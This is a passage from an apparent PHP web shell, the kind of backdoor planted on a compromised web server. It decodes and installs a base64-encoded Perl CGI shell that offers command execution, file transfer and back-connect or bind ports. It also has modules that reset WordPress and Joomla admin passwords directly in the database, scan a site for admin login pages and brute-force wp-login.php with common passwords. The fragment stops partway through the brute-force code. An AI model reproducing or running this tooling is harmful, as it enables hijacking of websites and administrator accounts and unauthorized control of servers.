BjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7CgkJfQoJfQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZpZXcgTG9nCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFZpZXdMb2cKewoJaWYoJFdpbk5UKQoJewoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7Cgl9CglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOwoJbXkgQHBhdGhsb2c9KAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywKCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycKCQkJCSk7CglteSAkaT0wOwoJbXkgJHBlcm1zOwoJbXkgJHNsOwoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykKCXsKCQlpZigtdyAkbG9nKQoJCXsKCQkJJHBlcm1zPSJPSyI7CgkJfWVsc2UKCQl7CgkJCWNob3AoJHNsID0gYGxuIC1zICRsb2cgZXJyb3JfbG9nXyRpYCk7CgkJCWlmKCZ0cmltKCRscykgZXEgIiIpCgkJCXsKCQkJCWlmKC1yICRscykKCQkJCXsKCQkJCQkkcGVybXM9Ik9LIjsKCQkJCQkkbG9nPSJlcnJvcl9sb2dfIi4kaTsKCQkJCX0KCQkJfWVsc2UKCQkJewoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7CgkJCX0KCQl9CgkJJHJlc3VsdCAuPTw8RU5EOwoJCTx0cj4KCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPgoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+CgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciIgLz4KCQkJPC9mb3JtPgoJCQk8dGQ+JHBlcm1zPC90ZD4KCgkJPC90cj4KRU5ECgkJJGkrKzsKCX0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiZSZWFkUGFyc2U7CiZHZXRDb29raWVzOwoKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9OwokUnVuQ29tbWFuZCA9ICRpbnsnYyd9OwokVHJhbnNmZXJGaWxlID0gJGlueydmJ307CiRPcHRpb25zID0gJGlueydvJ307CiRBY3Rpb24gPSAkaW57J2EnfTsKCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7CiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQokUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSIgaWYoJFJ1bkNvbW1hbmQgZXEgIiIpOwpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7CgokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7CgppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCEkV2luTlQpCgl7CgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCWlmKCEoJGNobW9kIGVxIDApKQoJCXsKCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJCQljaG9wKCRyZXN1bHQ9IGBjaG1vZCAkY2htb2QgIiRmaWxlImApOwoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CgkJfQoJfQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9OwoJaWYoISRyZW5hbWUgZXEgIiIpCgl7CgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpCgkJewoJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJfWVsc2UKCQl7CgkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJfQoJfQoJJHJlbW92ZT0kaW57J3JlbW92ZSd9OwoJaWYoJHJlbW92ZSBuZSAiIikKCXsKCQkkcm0gPSAkQ3VycmVudERpci4kUGF0aFNlcC4kcmVtb3ZlOwoJCWlmKC1kICRybSkKCQl7CgkJCSZSbURpcigkcm0pOwoJCX1lbHNlCgkJewoJCQlpZih1bmxpbmsoJHJtKSkKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CQkJCgkJfQoJfQoJcHJpbnQgJkxpc3REaXI7Cgp9CmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKQkJCQkgCSMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCXByaW50ICZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpCgl7CgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJfWVsc2UKCXsKCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJfQoJcHJpbnQgJkxpc3REaXI7Cn0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoKCXByaW50ICZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0CnsKCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsKCXByaW50ICZCYWNrQmluZDsKfQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJkJydXRlRm9yY2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CglwcmludCAmRG93bmxvYWRGaWxlOwp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCXByaW50ICZWaWV3TG9nOwoKfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbgp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0KJlByaW50UGFnZUZvb3Rlcjs=';

$file = fopen("cgi2012.izo" ,"w+");
$write = fwrite ($file ,base64_decode($cgi2012));
fclose($file);
    chmod("cgi2012.izo",0755);
   echo " <iframe src=cgi2012/cgi2012.izo width=96% height=76% frameborder=0></iframe>
 
 </div>"; }
 
 ///////////////////////////////////////////////////////////////////////////
 
elseif(isset($_GET['x']) && ($_GET['x'] == 'config'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=config" method="post">

<?php

echo "<center/><br/><b><font color=#00ff00>+--==[ Config Shell Priv8 SCR ]==--+</font></b><br><br>";

  mkdir('config', 0755);
    chdir('config');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
		
AddType application/x-httpd-cgi .cpc

AddHandler cgi-script .izo
AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);

$file = fopen("config.izo" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("config.izo",0755);
   echo "<iframe src=config/config.izo width=97% height=100% frameborder=0></iframe>
   </div>"; 
}
/////////////////////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'wp-reset'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=wp-reset" method="post">

<?php

echo "<center/><br/><b><font color=#00ff00>+--==[  Wordpress Reset Password  ]==--+</font></b><br><br>";
  
  if(empty($_POST['pwd'])){
  
echo "<FORM method='POST'>
<table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Hostname</td><td>
<input style='width:220px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:220px;' class='inputz' type='text' name='database' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:220px;' class='inputz' type='text' name='username' value='wp-' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:220px;' class='inputz' type='text' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:220px;' class='inputz' type='text' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;Pass Baru</td><td>
<input style='width:80px;' class='inputz' type='text' name='pwd' value='123456' />&nbsp;

<input style='width:19%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];


 @mysql_connect($localhost,$username,$password) or die(mysql_error());
 @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


if($a4s){
echo "<b> Success ..!! :)) sekarang bisa login ke wp-admin</b> ";
}

}
  
  
  echo "
   </div>"; }

elseif(isset($_GET['x']) && ($_GET['x'] == 'jm-reset'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jm-reset" method="post">

<?php

echo "<center/><br/><b><font color=#00ff00>+--==[  Joomla Reset Password ]==--+</font></b><br><br>";
	if(empty($_POST['pwd'])){
echo "<FORM method='POST'><table class='tabnet' style='width:300px;'> <tr><th colspan='2'>Connect to mySQL </th></tr> <tr><td>&nbsp;&nbsp;Host</td><td>
<input style='width:270px;' class='inputz' type='text' name='localhost' value='localhost' /></td></tr> <tr><td>&nbsp;&nbsp;Database</td><td>
<input style='width:270px;' class='inputz' type='text' name='database' value='database' /></td></tr> <tr><td>&nbsp;&nbsp;username</td><td>
<input style='width:270px;' class='inputz' type='text' name='username' value='db_user' /></td></tr> <tr><td>&nbsp;&nbsp;password</td><td>
<input style='width:270px;' class='inputz' type='password' name='password' value='**' /></td></tr>
<tr><td>&nbsp;&nbsp;User baru</td><td>
<input style='width:270px;' class='inputz' name='admin' value='admin' /></td></tr>
 <tr><td>&nbsp;&nbsp;pass baru </td><td>123456 = 
<input style='width:130px;' class='inputz' name='pwd' value='e10adc3949ba59abbe56e057f20f883e' />&nbsp;

<input style='width:23%;' class='inputzbut' type='submit' value='change!' name='send' /></FORM>
</td></tr> </table><br><br><br><br>
";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = crypt($pwd);
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 65") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 65") or die(mysql_error());
if($SQL){
echo "<b>Success : skarang password barunya >>> - (123456)";
}
}
	
  echo "
   </div>"; 
} 
//////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'adfin'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=adfin" method="post">

<?php
set_time_limit(0);
error_reporting(0);
$list['front'] ="admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel";
$list['end'] = "admin1.php
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-redirect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html";
function template() {
echo '

<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
    var $this = $text;
    var logbox = document.getElementById($place);
    if($replace == 0)
        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
    else
        document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
<br>
<br>
<h1 class="technique-two">
       


</h1>

<div class="wrapper">
<div class="red">
<div class="tube">
<center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
<form action="" method="post" name="xploit_form">

<tr>
<tr>
	<b><td>URL</td>
	<td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
	</td>
</tr><tr>
	<td>404 string</td>
	<td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
	</td></b>
</tr><br><td>
<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
</div> <!-- /red -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found ones:<br /></b>
</div> <!-- /tube -->
</div></center><!-- /green -->
<br clear="all" /><br />
<div class="blue">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder :<br /><br />
</div> <!-- /tube -->
</div> <!-- /blue -->
</div> <!-- /wrapper -->
<br clear="all"><br>';
}
function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
    if($br == 1) $msg .= "<br />";
    echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
    if($stop == 1) exit;
    @flush();@ob_flush();
}
function check($x, $front=0) {
    global $_POST,$site,$false;
    if($front == 0) $t = $site.$x;
    else $t = 'http://'.$x.'.'.$site.'/';
    $headers = get_headers($t);
    if (!eregi('200', $headers[0])) return 0;
    $data = @file_get_contents($t);
    if($_POST['xploit_404string'] == "") if($data == $false) return 0;
    if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
    return 1;
}
   
// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
template();
if(!isset($_POST['xploit_url'])) die;
if($_POST['xploit_url'] == '') die;
$site = $_POST['xploit_url'];
if ($site[strlen($site)-1] != "/") $site .= "/";
if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
$list['end'] = str_replace("\r", "", $list['end']);
$list['front'] = str_replace("\r", "", $list['front']);
$pathes = explode("\n", $list['end']);
$frontpathes = explode("\n", $list['front']);
show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
$verificate = 0;
foreach($pathes as $path) {
    show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
    }
}
preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
if(substr($site, 0, 3) == "www") $site = substr($site, 4);
foreach($frontpathes as $frontpath) {
    show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
    }
   
}
}
//////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'wpbrute'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=wpbrute" method="post">
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force ]=--+</font><br>
<center><p>Tanks To <a href="https://www.facebook.com/anton115" target="_blank">Cah_bagus</a></p></b></center>
<form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' class='tabnet' id='Box'>
  <tr><th colspan="5">Wordpress Brute Force</th></tr>
    

    <tr>
      <td >&nbsp;</td>
      <td ><p>Hosts:</p></td>
      <td ><p> Users:</p></td>
      <td ><p>Passwords:</p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td ><textarea style="background:black;" name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea style="background:black;" name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
      <td ><textarea style="background:black;" name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
    </tr>
<tr><td colspan="4"><input class='inputzbut' type="submit" name="submit" value="Brute Now"  />
<?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['passwords']));
	$usernames = trim(filter($_POST['usernames']));

	if($passwords && $usernames && $hosts)
	{
		$hosts_explode = explode("\n", $hosts);
		$usernames_explode = explode("\n", $usernames);
    	$passwords_explode = explode("\n", $passwords);

		foreach($hosts_explode as $host)
		{
			$host = RemoveLastSlash($host);
			$hacked = 0;
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			$host = "http://".$host;
			$wpAdmin = $host.'/wp-admin/';

			if(!url_exists($host."/wp-login.php"))
			{echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

			foreach($usernames_explode as $username)
			{
				foreach($passwords_explode as $password)
				{
					$ch   =     curl_init();
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
					curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
					curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_POST,TRUE);
